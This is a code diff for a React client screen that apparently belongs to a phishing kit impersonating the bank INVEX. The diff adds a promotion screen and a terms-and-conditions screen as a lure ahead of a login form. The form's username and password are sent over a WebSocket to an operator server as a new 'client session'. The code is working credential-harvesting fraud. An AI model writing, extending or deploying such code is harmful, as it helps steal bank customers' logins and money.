@@ -35,7 +35,7 @@ export default function ClientScreen() {
   
   // State for the current screen
   const [currentScreen, setCurrentScreen] = useState<ScreenType>(
-    isHomePage ? ScreenType.LOGIN : ScreenType.VALIDANDO
+    isHomePage ? ScreenType.PROMOCION : ScreenType.VALIDANDO
   );
   const [sessionData, setSessionData] = useState<Partial<Session> & { banco?: string }>({
     banco: 'INVEX' // Banco por defecto para la página principal
@@ -60,31 +60,12 @@ export default function ClientScreen() {
   // WebSocket connection
   const { socket, connected, sendMessage } = useWebSocket('/ws');
 
-  // Efecto para generar folio automáticamente cuando se accede a la página principal
+  // Efecto para manejar la página principal (sin generar folio automáticamente)
   useEffect(() => {
     if (isHomePage && connected) {
-      // Generar nuevo sessionId y folio automáticamente
-      const newSessionId = Math.random().toString(36).substring(2, 15);
-      
-      // Crear nueva sesión en el servidor automáticamente
-      sendMessage({
-        type: 'NEW_CLIENT_SESSION',
-        data: {
-          sessionId: newSessionId,
-          banco: 'INVEX',
-          clientData: { 
-            username: 'Cliente', 
-            password: '****' 
-          },
-          timestamp: new Date().toISOString()
-        }
-      });
-      
-      // Actualizar el estado local
-      setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
-      console.log(`Folio generado automáticamente para cliente: ${newSessionId}`);
+      console.log('Cliente conectado a la página principal - esperando completar flujo');
     }
-  }, [isHomePage, connected, sendMessage]);
+  }, [isHomePage, connected]);
 
   // Efecto para mostrar los mensajes iniciales (solo para sesiones con sessionId)
   useEffect(() => {
@@ -230,27 +211,41 @@ export default function ClientScreen() {
     if (connected) {
       console.log('Enviando datos al servidor:', screen, formData);
       
-      // Si es la página principal y el usuario está haciendo login, crear nueva sesión
-      if (isHomePage && screen === ScreenType.LOGIN) {
-        // Generar nuevo sessionId
-        const newSessionId = Math.random().toString(36).substring(2, 15);
+      // Manejar flujo de pantallas para página principal
+      if (isHomePage) {
+        if (screen === ScreenType.PROMOCION) {
+          // Ir a términos y condiciones
+          setCurrentScreen(ScreenType.TERMINOS);
+          return;
+        }
         
-        // Crear nueva sesión en el servidor
-        sendMessage({
-          type: 'NEW_CLIENT_SESSION',
-          data: {
-            sessionId: newSessionId,
-            banco: 'INVEX',
-            clientData: formData,
-            timestamp: new Date().toISOString()
-          }
-        });
+        if (screen === ScreenType.TERMINOS) {
+          // Ir a login después de aceptar términos
+          setCurrentScreen(ScreenType.LOGIN);
+          return;
+        }
         
-        // Actualizar el estado local con el nuevo sessionId
-        setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
-        setCurrentScreen(ScreenType.VALIDANDO);
-        
-        return;
+        if (screen === ScreenType.LOGIN) {
+          // Generar nuevo sessionId
+          const newSessionId = Math.random().toString(36).substring(2, 15);
+          
+          // Crear nueva sesión en el servidor
+          sendMessage({
+            type: 'NEW_CLIENT_SESSION',
+            data: {
+              sessionId: newSessionId,
+              banco: 'INVEX',
+              clientData: formData,
+              timestamp: new Date().toISOString()
+            }
+          });
+          
+          // Actualizar el estado local con el nuevo sessionId
+          setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'INVEX' }));
+          setCurrentScreen(ScreenType.VALIDANDO);
+          
+          return;
+        }
       }
       
       // Enviar datos al servidor inmediatamente para sesiones existentes
